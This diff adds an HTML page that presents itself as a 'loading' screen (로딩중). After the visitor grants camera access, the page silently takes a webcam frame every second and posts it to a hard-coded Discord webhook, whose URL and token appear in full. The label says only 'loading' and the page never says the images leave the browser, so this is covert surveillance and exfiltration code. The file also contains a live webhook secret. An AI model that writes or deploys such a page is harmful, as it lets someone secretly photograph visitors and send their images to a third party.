@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>로딩중 -> 웹훅</title>
+</head>
+<body>
+  <h1>로딩중</h1>
+  <video id="video" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1394055166491365519/msGP4m22xRY2U3Km-P6mNAiPgTiYYzEkn_qbk7CfRGc6u_xGsl5hIUBDSrfOZYLKaNYK"; // ← 반드시 본인 것만 사용하세요
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    // 카메라 권한 요청 및 스트리밍 시작
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        setInterval(captureAndSend, 1000); // 1초마다 전송
+      })
+      .catch(error => {
+        alert('카메라 접근 실패: ' + error);
+      });
+
+    async function captureAndSend() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Blob으로 변환
+      canvas.toBlob(async blob => {
+        const formData = new FormData();
+        formData.append("file", blob, "capture.jpg");
+
+        try {
+          await fetch(webhookURL, {
+            method: "POST",
+            body: formData
+          });
+        } catch (err) {
+          console.error("웹훅 전송 실패:", err);
+        }
+      }, "image/jpeg");
+    }
+  </script>
+</body>
+</html>
